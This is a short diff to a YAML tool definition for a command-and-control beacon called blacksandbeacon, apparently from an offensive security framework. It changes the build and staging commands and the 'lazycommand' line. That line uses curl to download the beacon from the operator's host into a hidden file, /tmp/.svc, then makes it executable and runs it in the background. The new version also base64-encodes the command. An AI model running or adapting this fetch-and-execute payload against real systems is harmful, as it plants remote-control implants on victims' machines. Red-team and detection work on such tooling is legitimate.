@@ -39,9 +39,8 @@ tool:
   repo_url: https://github.com/grisuno/blacksandbeacon.git
   install_path: external/.exploit/blacksandbeacon
   install_command: make
-  execute_command: git restore . ; git pull ; make && cp blacksandbeacon ../../../sessions/blacksandbeacon
-    && echo "[blacksandbeacon] beacon staged at sessions/blacksandbeacon"
+  execute_command: git restore . ; git pull ; make && cp build/beacon ../../../sessions/temp_uploads/blacksandbeacon
+    && echo "[blacksandbeacon] beacon staged at sessions/temp_uploads/blacksandbeacon"
   download_file: /tmp/.svc
-  lazycommand: curl -sk "http://{lhost}:{lport}/blacksandbeacon" -o /tmp/.svc && chmod
-    +x /tmp/.svc && /tmp/.svc &
+  lazycommand: encodewinbase64 curl -sk "https://{lhost}:{c2_port}/download/blacksandbeacon" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
 category: 10. Command & Control
